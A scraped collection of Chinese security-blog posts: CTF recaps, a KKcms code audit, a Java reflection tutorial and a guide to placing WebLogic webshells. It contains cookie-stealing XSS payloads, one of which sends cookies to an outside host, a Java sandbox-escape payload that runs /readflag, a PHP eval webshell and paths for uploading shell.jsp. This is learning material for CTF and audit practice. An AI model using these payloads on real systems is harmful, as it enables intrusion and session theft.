&#123; const &#123; username, password, role &#125; = req.body; const userExists = users.some(u =&gt; u.username === username); if (userExists) &#123; return res.send(&#x27;Username already exists!&#x27;); &#125; users.push(&#123; username, password, role: &quot;plain&quot; &#125;); res.redirect(&#x27;/login&#x27;); &#125;); router.get(&#x27;/login&#x27;, (req, res) =&gt; &#123; res.sendFile(&#x27;login.html&#x27;, &#123; root: &#x27;./views&#x27; &#125;); &#125;); router.post(&#x27;/login&#x27;, (req, res) =&gt; &#123; const &#123; username, password &#125; = req.body; console.log(username); console.log(password); const user = users.find(u =&gt; u.username === username &amp;&amp; u.password === password); if (user) &#123; req.session.user = user; res.redirect(&#x27;/&#x27;); &#125; else &#123; res.send(&#x27;Invalid credentials!&#x27;); &#125; &#125;); router.get(&#x27;/&#x27;, isAuthenticated, (req, res) =&gt; &#123; const currentUser = req.session.user; let filteredPosts = []; if (currentUser.role === ROLES.ADMIN) &#123; filteredPosts = posts.filter(p =&gt; p.role === ROLES.PRIVILEGED || p.role === ROLES.ADMIN); &#125; else if (currentUser.role === ROLES.PRIVILEGED) &#123; filteredPosts = posts.filter(p =&gt; p.role === ROLES.PLAIN || p.role === ROLES.PRIVILEGED); &#125; else &#123; filteredPosts = posts.filter(p =&gt; p.role === ROLES.PLAIN); &#125; res.render(`$&#123;currentUser.role&#125;`, &#123; posts: filteredPosts, user: currentUser &#125;); &#125;); router.post(&#x27;/post&#x27;, isAuthenticated, (req, res) =&gt; &#123; let &#123; content &#125; = req.body; const scriptTagRegex = /&lt;script\\b[^&lt;]*(?:(?!&lt;\\/script&gt;)&lt;[^&lt;]*)*&lt;\\/script&gt;/gi; content = content.replace(scriptTagRegex, &#x27;[XSS attempt blocked]&#x27;); const eventHandlerRegex = /on\\w+\\s*=\\s*([&quot;&#x27;]).*?\\1/gi; content = content.replace(eventHandlerRegex, &#x27;[XSS attempt blocked]&#x27;); const javascriptURLRegex = /(?:href|src)\\s*=\\s*([&quot;&#x27;])\\s*javascript:.*?\\1/gi; content = content.replace(javascriptURLRegex, &#x27;[XSS attempt blocked]&#x27;); const dataURLRegex = /(?:href|src)\\s*=\\s*([&quot;&#x27;])\\s*data:.*?\\1/gi; content = content.replace(dataURLRegex, &#x27;[XSS attempt blocked]&#x27;); const cssExpressionRegex = /style\\s*=\\s*([&quot;&#x27;]).*?expression\\([^&gt;]*?\\).*?\\1/gi; content = content.replace(cssExpressionRegex, &#x27;[XSS attempt blocked]&#x27;); const dangerousTagsRegex = /&lt;\\/?(?:iframe|object|embed|link|meta|svg|base|source|form|input|video|audio|textarea|button|frame|frameset|applet)[^&gt;]*?&gt;/gi; content = content.replace(dangerousTagsRegex, &#x27;[XSS attempt blocked]&#x27;); const dangerousAttributesRegex = /\\b(?:style|srcset|formaction|xlink:href|contenteditable|xmlns)\\s*=\\s*([&quot;&#x27;]).*?\\1/gi; content = content.replace(dangerousAttributesRegex, &#x27;[XSS attempt blocked]&#x27;); const dangerousProtocolsRegex = /(?:href|src)\\s*=\\s*([&quot;&#x27;])(?:\\s*javascript:|vbscript:|file:|data:|filesystem:).*?\\1/gi; content = content.replace(dangerousProtocolsRegex, &#x27;[XSS attempt blocked]&#x27;); const dangerousFunctionsRegex = /\\b(?:eval|alert|prompt|confirm|console\\.log|Function)\\s*\\(/gi; content = content.replace(dangerousFunctionsRegex, &#x27;[XSS attempt blocked]&#x27;); posts.push(&#123; content: content, username: req.session.user.username, role: req.session.user.role &#125;); res.redirect(&#x27;/&#x27;); &#125;); router.get(&#x27;/logout&#x27;, (req, res) =&gt; &#123; req.session.destroy(); res.redirect(&#x27;/login&#x27;); &#125;); router.get(&#x27;/report_admin&#x27;, async (req, res) =&gt; &#123; try &#123; await triggerXSS(&quot;admin&quot;,AdminPassWord); res.send(`Admin Bot successfully logged in.`); &#125; catch (error) &#123; console.error(&#x27;Error Reporting:&#x27;, error); res.send(`Admin Bot successfully logged in.`); &#125; &#125;); router.get(&#x27;/report_privileged&#x27;, async (req, res) =&gt; &#123; try &#123; await triggerXSS(&quot;privileged&quot;,PrivilegedPassWord); res.send(`Privileged Bot successfully logged in.`); &#125; catch (error) &#123; console.error(&#x27;Error Reporting:&#x27;, error); res.send(`Privileged Bot successfully logged in.`); &#125; &#125;); router.get(&#x27;/store&#x27;, async (req, res) =&gt; &#123; return res.status(200).json(store); &#125;); router.post(&#x27;/store&#x27;, async (req, res) =&gt; &#123; if (req.body) &#123; store.push(req.body); return res.status(200).send(&#x27;Data stored successfully&#x27;); &#125; else &#123; return res.status(400).send(&#x27;No data received&#x27;); &#125; &#125;); router.get(&#x27;/flag&#x27;, async (req, res) =&gt; &#123; try &#123; if (req.session.user &amp;&amp; req.session.user.role === &quot;admin&quot;) &#123; fs.readFile(&#x27;/flag&#x27;, &#x27;utf8&#x27;, (err, data) =&gt; &#123; if (err) &#123; console.error(&#x27;Error reading flag file:&#x27;, err); return res.status(500).send(&#x27;Internal Server Error&#x27;); &#125; res.send(`Your Flag Here: $&#123;data&#125;`); &#125;); &#125; else &#123; res.status(403).send(&#x27;Unauthorized!&#x27;); &#125; &#125; catch (error) &#123; console.error(&#x27;Error fetching flag:&#x27;, error); res.status(500).send(&#x27;Internal Server Error&#x27;); &#125; &#125;); return router;&#125;; 这个题一眼xss嘛，然后有两种解题思路，一个是插入js代码利用/store路由，然后访问/report_privileged将privilege用户的cookie储存到/store中，然后同样的步骤再来一次获取admin的cookie 12&lt;script&gt;fetch(&#x27;/store&#x27;,&#123;body:&quot;&#x27;&#x27;p&quot;+`rivileged_cookie&#x27;&#x27;=`+encodeURIComponent(document.cookie),method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;&#125;)&lt;/script&gt; 或者就是直接弹出privilege和admin的cookie 1&lt;img src=&quot;&quot; onerror=document.location=&#x27;http://vps:port?cookie=&#x27;+document.cookie /&gt; OnlineRunner这道题没有办法用import的方式来导入类，能执行命令的都不能用，反射也没有办法直接执行命令，看别的师傅是要绕过一个沙箱 探索Java RASP Bypass新姿势 这里我还是有点懵，直接贴别的师傅的payload 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134String[] files = &#123;&quot;/proc/net/tcp&quot;, &quot;/proc/net/tcp6&quot;&#125;; for (int f = 0; f &lt; files.length; f++) &#123; try &#123; java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.FileReader(files[f])); String line; reader.readLine(); // Skip header line while ((line = reader.readLine()) != null) &#123; line = line.trim(); String[] parts = line.split(&quot;\\\\s+&quot;); if (parts.length &gt; 3) &#123; String local_address = parts[1]; String state = parts[3]; // State 0A means LISTEN if (state.equals(&quot;0A&quot;)) &#123; String[] addrPort = local_address.split(&quot;:&quot;); String ipHex = addrPort[0]; String portHex = addrPort[1]; String ip = &quot;&quot;; if (files[f].endsWith(&quot;tcp6&quot;)) &#123; // IPv6 address parsing StringBuilder ipBuilder = new StringBuilder(); for (int i = ipHex.length(); i &gt; 0; i -= 8) &#123; String segment = ipHex.substring(Math.max(i - 8, 0), i); StringBuilder segBuilder = new StringBuilder(); for (int j = segment.length(); j &gt; 0; j -= 2) &#123; segBuilder.append(segment.substring(j - 2, j)); &#125; ipBuilder.insert(0, segBuilder.toString()); if (i &gt; 8) &#123; ipBuilder.insert(0, &quot;:&quot;); &#125; &#125; ip = ipBuilder.toString(); &#125; else &#123; // IPv4 address parsing StringBuilder ipBuilder = new StringBuilder(); for (int i = ipHex.length(); i &gt; 0; i -= 2) &#123; String part = ipHex.substring(i - 2, i); int num = Integer.parseInt(part, 16); ipBuilder.insert(0, num); if (i &gt; 2) &#123; ipBuilder.insert(0, &quot;.&quot;); &#125; &#125; ip = ipBuilder.toString(); &#125; int port = Integer.parseInt(portHex, 16); System.out.println(&quot;Listening on &quot; + ip + &quot;:&quot; + port); &#125; &#125; &#125; reader.close(); &#125; catch (java.io.IOException e) &#123; System.out.println(e); &#125; &#125;try &#123; java.net.URL url = new java.net.URL(&quot;http://127.0.0.1:46461/sandbox/default/module/http/sandbox-control/shutdown&quot;); java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection(); connection.setRequestMethod(&quot;GET&quot;); java.io.BufferedReader reader = new java.io.BufferedReader( new java.io.InputStreamReader(connection.getInputStream()) ); String line; StringBuilder response = new StringBuilder(); while ((line = reader.readLine()) != null) &#123; response.append(line).append(&quot;\\n&quot;); &#125; reader.close(); connection.disconnect(); System.out.println(response.toString()); System.out.println(connection.getResponseCode()); &#125; catch (java.io.IOException e) &#123; System.out.println(e); &#125; try &#123; String command = &quot;/readflag&quot;; // Use &quot;dir&quot; on Windows java.lang.Process process = java.lang.Runtime.getRuntime().exec(command); java.io.BufferedReader reader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream()) ); String line; while ((line = reader.readLine()) != null) &#123; System.out.println(line); &#125; reader.close(); process.waitFor(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;/*try&#123;java.io.File folder = new java.io.File(&quot;/home&quot;); if (!folder.isDirectory()) &#123; System.out.println(&quot;Provided path is not a folder&quot;); return; &#125; java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream(); java.util.zip.ZipOutputStream zos = new java.util.zip.ZipOutputStream(baos); java.util.Stack&lt;java.io.File&gt; stack = new java.util.Stack&lt;java.io.File&gt;(); stack.push(folder); while (!stack.isEmpty()) &#123; java.io.File currentFile = stack.pop(); if (currentFile.isDirectory()) &#123; java.io.File[] fileList = currentFile.listFiles(); if (fileList != null) &#123; for (int i = 0; i &lt; fileList.length; i++) &#123; stack.push(fileList[i]); &#125; &#125; &#125; else &#123; java.io.FileInputStream fis = new java.io.FileInputStream(currentFile); String zipEntryName = currentFile.getAbsolutePath().substring(folder.getAbsolutePath().length() + 1); zos.putNextEntry(new java.util.zip.ZipEntry(zipEntryName)); byte[] buffer = new byte[1024]; int length; while ((length = fis.read(buffer)) &gt; 0) &#123; zos.write(buffer, 0, length); &#125; fis.close(); zos.closeEntry(); &#125; &#125; zos.close(); byte[] zipBytes = baos.toByteArray(); StringBuilder hexString = new StringBuilder(); for (int i = 0; i &lt; zipBytes.length; i++) &#123; String hex = Integer.toHexString(0xff &amp; zipBytes[i]); if (hex.length() == 1) hexString.append(&#x27;0&#x27;); hexString.append(hex); &#125; System.out.println(hexString.toString());&#125;catch(Exception e)&#123;System.out.println(e);&#125;*/ 123456789101112131415161718#读取文件try &#123; java.io.File file = new java.io.File(&quot;/home/ctf/sandbox/lib/sandbox-agent.jar&quot;); // 需要读取的二进制文件 java.io.BufferedInputStream bis = new java.io.BufferedInputStream(new java.io.FileInputStream(file)); byte[] buffer = new byte[1024]; // 创建一个字节数组作为缓冲区 int bytesRead; while ((bytesRead = bis.read(buffer)) != -1) &#123; // 循环读取 // 处理读取的数据（这里可以进行打印、处理等） //System.out.write(buffer, 0, bytesRead); System.out.print(&#x27;&quot;&#x27;); System.out.print(java.util.Base64.getEncoder().encodeToString(buffer)); System.out.println(&quot;\\&quot;,&quot;); &#125; &#125; catch ( java.io.IOException e) &#123; e.printStackTrace(); &#125; 其实比赛的时候想过用base64将文件编码读取，但是因为数据过大导致网页卡死了就没有继续想过了 唉，还得继续学，太菜了","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"复盘","slug":"ctf/复盘","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"KKcms代审","slug":"KKcms代审","date":"2024-10-14T17:48:36.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2024/10/15/KKcms代审/","permalink":"https://lvzhouhang.xyz/2024/10/15/KKcms%E4%BB%A3%E5%AE%A1/","excerpt":"","text":"环境安装源码下载地址：https://github.com/erichuang2015/kkcms php5.6 .9+mysql5.7.26+apache2.4.39 审计验证码复用 1&lt;img src=&quot;../system/verifycode.php&quot; onclick=&quot;javascript:this.src=&#x27;../system/verifycode.php?&#x27;+Math.random()&quot; style=&quot;cursor:pointer;&quot; alt=&quot;点击更换&quot; title=&quot;点击更换&quot; /&gt; 这串代码用来执行js代码更换验证码，但是bp它默认不加载js，所以造成了验证码复用。 123456789101112131415161718&lt;?phpsession_start();$image = imagecreate(50, 34);$bcolor = imagecolorallocate($image, 0, 0, 0);$fcolor = imagecolorallocate($image, 255, 255, 255);$str = &#x27;0123456789&#x27;;$rand_str = &#x27;&#x27;;for ($i = 0; $i &lt; 4; $i++)&#123; $k = mt_rand(1, strlen($str)); $rand_str .= $str[$k - 1];&#125;$_SESSION[&#x27;verifycode&#x27;] = $rand_str;imagefill($image, 0, 0, $bcolor);imagestring($image, 7, 7, 10, $rand_str, $fcolor);header(&#x27;content-type:image/png&#x27;);imagepng($image);?&gt; verifycode.php的代码，就是生成一个随机的4位0-9的图片验证码 文件上传这个cms默认用的编辑器是KindEditor,版本是4.1.10，构造payload 1&lt;html&gt;&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;http://127.0.0.1/editor/php/upload_json.php&quot; method=&quot;post&quot;&gt; Upload a new file:&lt;br&gt; &lt;input type=&quot;file&quot; name=&quot;imgFile&quot; size=&quot;50&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt; &lt;/form&gt;&lt;/html&gt; 可以直接上传文件，但是没什么用。 而且他有白名单，只能上传指定的后缀文件。 前台sql注入在template\\wapian\\vlist.php这里 我们可以看到他没有任何的防护，但其实是有防护的,vlist.php里包含了system/inc.php,而inc.php中有一个转义的函数 但是这里为什么可以注入呢？是因为这里是数字型注入，没有用双引号包裹，自然也不用双引号进行闭合，addslashes也就没起上作用,放进sqlmap里就可以跑出来。 前台sql注入2在ucenter\\reg.php里 这里为什么可以注入呢？这里是因为他有一个stripslashes函数，它会删除由addslashes添加上的斜杠，放进sqlmap里跑 也是可以跑出来盲注。搜索stripslashes关键字，可以找到repass.php和active.php同样有注入。 后台sql注入在cms_usergroup_edit.php处 修改会员级别处有盲注，但是sql跑不出来不知道为什么。然后和此处一样的还有cms_ad_edit.php、cms_admin_edit.php、cms_book_edit.php、cms_channel_edit.php 还有一处 这里有delete注入，整个后台的delete语句全是这样写的。 XSS漏洞就不审计了，这个cms就这样吧，一个比较简单的cms。","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://lvzhouhang.xyz/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"},{"name":"代码审计","slug":"代码审计","permalink":"https://lvzhouhang.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"java反射","slug":"java反射","date":"2024-05-31T00:44:30.000Z","updated":"2025-04-19T13:25:36.799Z","comments":true,"path":"2024/05/31/java反射/","permalink":"https://lvzhouhang.xyz/2024/05/31/java%E5%8F%8D%E5%B0%84/","excerpt":"","text":"什么是反射反射是大多数语言都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将 Java 这种静态语⾔附加上动态特性。 Java反射组成相关的类java.lang.Class：类对象; java.lang.reflect.Constructor：类的构造器对象; java.lang.reflect.Field：类的属性对象; java.lang.reflect.Method：类的方法对象; 实例化对象的方法实例化对象的getClass()方法如果上下⽂中存在某个类的实例 obj，那么我们可以通过 obj.getClass 来获取它的类。 使用类的 .class 方法如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个⽅法其实不属于反射。 Class.forName(String className)：动态加载类如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取，后续要利用的话是需要实例化的。 获取成员变量Field获取成员变量Field位于 java.lang.reflect.Field 包中 Field[] getFields() ：获取所有 public 修饰的成员变量 Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符 Field getField(String name) 获取指定名称的 public 修饰的成员变量 Field getDeclaredField(String name) 获取指定的成员变量 获取成员方法 Method123456789Method getMethod(String name, 类&lt;?&gt;... parameterTypes) //返回该类所声明的public方法Method getDeclaredMethod(String name, 类&lt;?&gt;... parameterTypes) //返回该类所声明的所有方法//第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型Method[] getMethods() //获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法Method[] getDeclaredMethods() // 获取该类中的所有方法 获取构造函数 Constructor1234567Constructor&lt;?&gt;[] getConstructors() ：只返回public构造函数Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有构造函数Constructor&lt;&gt; getConstructor(类&lt;?&gt;... parameterTypes) : 匹配和参数配型相符的public构造函数Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;... parameterTypes) ： 匹配和参数配型相符的构造函数 命令执行获取 class 实例 之后 获取类名：forName() 创建对应类型的实例：newInstance() 获取字段的值：get()、设置字段的值：set() 获取方法：getMethod()、调用方法：invoke() 基本知识就是这些，如何执行命令呢，举个例子 123456789101112131415package src;import java.lang.reflect.Field;import java.lang.reflect.Method;public class FinalReflectionCalc &#123; public static void main(String[] args) throws Exception&#123; Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);//创建一个runtime的方法 Method c2 = c1.getDeclaredMethod(&quot;getRuntime&quot;);//获取getRuntime的方法 c2.setAccessible(true);//使getRuntime可访问，因为getRuntime是私有属性 Object o1 = c2.invoke(null);//调用静态方法，无需实例 Method m1 = c1.getDeclaredMethod(&quot;exec&quot;,String.class);//获取exec方法 m1.invoke(o1,&quot;calc&quot;);//弹计算器 &#125;&#125; 这是调用静态方法，不需要实例 当然也可以实现一个新实例 1234567891011121314151617package src;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;public class FinalReflectionCalc &#123; public static void main(String[] args) throws Exception&#123; Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);//获取Runtime的Class对象 Constructor c2=c1.getDeclaredConstructor();//获取Runtime类的无参构造函数 c2.setAccessible(true);//使getRuntime可访问 Object c3=c2.newInstance();//创建Runtime的新实例 Method exec = c1.getDeclaredMethod(&quot;exec&quot;, String.class); exec.invoke(c3,&quot;calc&quot;);//弹计算器 &#125;&#125; Java反序列化基础篇-02-Java反射与URLDNS链分析参考链接，写的很清晰 Java反射 Java反射修改字段private123456789101112131415161718package src;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class PrivateReflect &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException &#123; Class c = Class.forName(&quot;src.PrivatePerson&quot;); Object m = c.newInstance(); Method PrintMethod = c.getDeclaredMethod(&quot;printName&quot;); PrintMethod.invoke(m); Field nameField = c.getDeclaredField(&quot;name&quot;); nameField.setAccessible(true); nameField.set(m, new StringBuilder(&quot;aaaaa&quot;)); PrintMethod.invoke(m); &#125;&#125; 123456789package src;public class PrivatePerson &#123; private StringBuilder name = new StringBuilder(&quot;lll&quot;); public void printName() &#123; System.out.println(name); &#125;&#125; static单独出现的话，用getDeclaredField也可以 123456789101112131415161718package src;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class PrivateReflect &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException &#123; Class c = Class.forName(&quot;src.PrivatePerson&quot;); Object m =c.newInstance(); Method f = c.getDeclaredMethod(&quot;printName&quot;); f.invoke(m); Field ff=c.getDeclaredField(&quot;name&quot;); ff.setAccessible(true); ff.set(m,new StringBuilder(&quot;lvzhouhang&quot;)); f.invoke(m); &#125;&#125; finalfinal 字段能否修改，有且取决于字段是直接赋值还是间接赋值（编译时赋值和运行时赋值的区别）。直接赋值是指在创建字段时就对字段进行赋值，并且值为 JAVA 的 8 种基础数据类型或者 String 类型，而且值不能是经过逻辑判断产生的，其他情况均为间接赋值。 直接赋值123456789101112package src;public class FinalStraightPerson &#123; private final String name = &quot;lvzhouhang&quot;; public final int age = 21-1; public void printInfo() &#123; System.out.println(name+&quot; &quot;+age); &#125;&#125; 12345678910111213141516171819202122package src;import java.lang.reflect.Field;import java.lang.reflect.Method;public class FinalStraightReflect &#123; public static void main(String[] args) throws Exception &#123; Class c = Class.forName(&quot;src.FinalStraightPerson&quot;); Object m = c.newInstance(); Method printMethod = c.getDeclaredMethod(&quot;printInfo&quot;); printMethod.invoke(m); Field nameField = c.getDeclaredField(&quot;name&quot;); Field ageField = c.getDeclaredField(&quot;age&quot;); nameField.setAccessible(true); ageField.setAccessible(true); nameField.set(m,&quot;lvzhouhang&quot;); ageField.set(m,&quot;20&quot;); printMethod.invoke(m); &#125;&#125; 这样通过反射修改会报错 123456Exception in thread &quot;main&quot; java.lang.IllegalArgumentException: Can not set final int field src.FinalStraightPerson.age to java.lang.String at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:167) at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:171) at sun.reflect.UnsafeQualifiedIntegerFieldAccessorImpl.set(UnsafeQualifiedIntegerFieldAccessorImpl.java:100) at java.lang.reflect.Field.set(Field.java:764) at src.FinalStraightReflect.main(FinalStraightReflect.java:18) 为什么呢？ 因为JVM在编译时期, 就把final类型的String进行了优化, 在编译时期就会把String处理成常量，只要是让name的值经过运行才能获得, 那么就不会被处理为常量。 间接修改123456789101112131415161718192021222324package src;import java.lang.reflect.Field;import java.lang.reflect.Method;public class InDirectReflect &#123; public static void main(String[] args) throws Exception &#123; Class c = Class.forName(&quot;src.InDirectPerson&quot;); Object m = c.newInstance(); Method printMethod = c.getDeclaredMethod(&quot;printInfo&quot;); printMethod.invoke(m); Field nameField = c.getDeclaredField(&quot;name&quot;); Field ageField = c.getDeclaredField(&quot;age&quot;); Field sexField = c.getDeclaredField(&quot;sex&quot;); nameField.setAccessible(true); ageField.setAccessible(true); sexField.setAccessible(true); nameField.set(m,&quot;lvzhouhang&quot;); ageField.set(m,200); sexField.set(m,new StringBuilder(&quot;female&quot;)); printMethod.invoke(m); &#125;&#125; 1234567891011121314151617package src;public class InDirectPerson &#123; private final StringBuilder sex = new StringBuilder(&quot;male&quot;); // 经过逻辑判断产生的变量赋值 public final int age = (null!=null?20:20); // 通过构造函数进行赋值 private final String name; public InDirectPerson()&#123; name = &quot;lvzhouhang&quot;; &#125; public void printInfo() &#123; System.out.println(name+&quot; &quot;+age+&quot; &quot;+sex); &#125;&#125; 这样就修改成功了 static+final12345678910package src;public class finalstaticreflection &#123; private final static StringBuilder name = new StringBuilder(&quot;lvzhouhang&quot;); public void printName() &#123; System.out.println(name); &#125;&#125; 123456789101112131415161718package src;import java.lang.reflect.Field;import java.lang.reflect.Method;public class finalstaticflectioncalc &#123; public static void main(String[] args) throws Exception&#123; finalstaticreflection c = new finalstaticreflection(); Method m = c.getClass().getDeclaredMethod(&quot;printName&quot;); m.invoke(c); Field f = c.getClass().getField(&quot;name&quot;); f.setAccessible(true); f.set(c,new StringBuilder(&quot;lllllvzhouhang&quot;)); m.invoke(c); &#125;&#125; 这样使修改不成功的，但是还是可以修改，通过反射将name字段取出来后将final修饰符去掉就可以修改 1234567891011121314151617181920212223242526package src;import com.sun.org.apache.xpath.internal.operations.Mod;import java.io.File;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.lang.reflect.Modifier;public class finalstaticflectioncalc &#123; public static void main(String[] args) throws Exception&#123; finalstaticreflection c = new finalstaticreflection(); Method m = c.getClass().getDeclaredMethod(&quot;printName&quot;); c.printName(); Field f = c.getClass().getDeclaredField(&quot;name&quot;); f.setAccessible(true); Field ff = f.getClass().getDeclaredField(&quot;modifiers&quot;); ff.setAccessible(true); ff.setInt(f,f.getModifiers() &amp; ~Modifier.FINAL);//去掉final修饰符 f.set(c,new StringBuilder(&quot;lllllvzhouhang&quot;)); ff.setInt(f,f.getModifiers() &amp; ~Modifier.FINAL);//加上final修饰符 c.printName(); &#125;&#125; 这样就成功修改了","categories":[{"name":"JAVA","slug":"JAVA","permalink":"https://lvzhouhang.xyz/categories/JAVA/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://lvzhouhang.xyz/tags/JAVA/"}]},{"title":"weblogic上传马路径选择","slug":"weblogic上传马路径选择","date":"2024-04-12T00:23:23.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2024/04/12/weblogic上传马路径选择/","permalink":"https://lvzhouhang.xyz/2024/04/12/weblogic%E4%B8%8A%E4%BC%A0%E9%A9%AC%E8%B7%AF%E5%BE%84%E9%80%89%E6%8B%A9/","excerpt":"","text":"weblogic上传木马路径选择对于反序列化漏洞，如果获得的是系统权限或者root权限，那就没必要上传木马，但如果只是web安装应用的权限，就上传获取更大权限。 上传需要找到几个点，获取物理路径，如下面三种： 方法1：把shell写到控制台images目录中\\Oracle\\Middleware\\wlserver_10.3\\server\\lib\\consoleapp\\webapp\\framework\\skins\\wlsconsole\\images\\shell.jsp 目录上传木马，访问 http://*.*.*.*:7001/console/framework/skins/wlsconsole/images/shell.jsp 方法2：写到uddiexplorer目录中\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\servers\\AdminServer\\tmp\\_WL_internal\\uddiexplorer\\随机字符\\war\\shell.jsp 目录写入木马，访问 http://*.*.*.*:7001/uddiexplorer/shell.jsp 方法3：在应用安装目录中\\Oracle\\Middleware\\user_projects\\domains\\application\\servers\\AdminServer\\tmp\\_WL_user\\项目名\\随机字符\\war\\shell.jsp 目录写入木马，访问 http://*.*.*.*:7001/项目名/shell.jsp","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"WolvCTF2024-复盘","slug":"WolvCTF2024-复盘","date":"2024-03-18T09:40:20.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2024/03/18/WolvCTF2024-复盘/","permalink":"https://lvzhouhang.xyz/2024/03/18/WolvCTF2024-%E5%A4%8D%E7%9B%98/","excerpt":"","text":"Bean Cafe他的验证逻辑是通过图片的md5的值来验证的，所以我们只需要传两张MD5相同的图片就可以获得flag https://drive.google.com/drive/folders/1eCcMtQkHTreAJT6JmwxG10x1HbT6prY0 Upload Fun123456789101112131415161718192021222324252627282930313233343536373839&lt;?php if($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot;)&#123; if ($_FILES[&quot;f&quot;][&quot;size&quot;] &gt; 1000) &#123; echo &quot;file too large&quot;; return; &#125; if (str_contains($_FILES[&quot;f&quot;][&quot;name&quot;], &quot;..&quot;)) &#123; echo &quot;no .. in filename please&quot;; return; &#125; if (empty($_FILES[&quot;f&quot;]))&#123; echo &quot;empty file&quot;; return; &#125; $ip = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; $flag = file_get_contents(&quot;/flag.txt&quot;); $hash = hash(&#x27;sha256&#x27;, $flag . $ip); if (move_uploaded_file($_FILES[&quot;f&quot;][&quot;tmp_name&quot;], &quot;./uploads/&quot; . $hash . &quot;_&quot; . $_FILES[&quot;f&quot;][&quot;name&quot;])) &#123; echo &quot;upload success&quot;; &#125; else &#123; echo &quot;upload error&quot;; &#125; &#125; else &#123; if (isset($_GET[&quot;f&quot;])) &#123; $path = &quot;./uploads/&quot; . $_GET[&quot;f&quot;]; if (str_contains($path, &quot;..&quot;)) &#123; echo &quot;no .. in f please&quot;; return; &#125; include $path; &#125; highlight_file(&quot;index.php&quot;); &#125;?&gt; 首先分析一下源码，源码通过POST方式来上传文件并且上传的文件不能包含..用GET的方式来读取文件也不能带有..，上传的文件在uploads目录下，但是我们不知道$hash是什么。 通过谷歌得知在linux种文件名的长度最大可为255个字符，我们可以通过这种方式让它报错来得知他的值 我们可以看到他的回显告诉我们了hash的值，然后我们再上传一句话木马访问即可。 POST上传文件的请求体模板: 1234567891011121314151617181920212223242526POST / HTTP/2Host: Cache-Control: max-age=0Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;122&quot;, &quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;122&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Windows&quot;Upgrade-Insecure-Requests: 1Origin: https://0ad900b10331bc6f843fbff300b80018.web-security-academy.netContent-Type: multipart/form-data; boundary=----WebKitFormBoundarylZktl8pLMuKyOfByUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Content-Length: 198------WebKitFormBoundarylZktl8pLMuKyOfByContent-Disposition: form-data; name=&quot;&quot;; filename=&quot;&quot;Content-Type: &lt;?php eval($_POST[&#x27;1&#x27;])?&gt;------WebKitFormBoundarylZktl8pLMuKyOfBy Username题目提示了jwt可以爆破，那这道题肯定和jwt伪造有关。 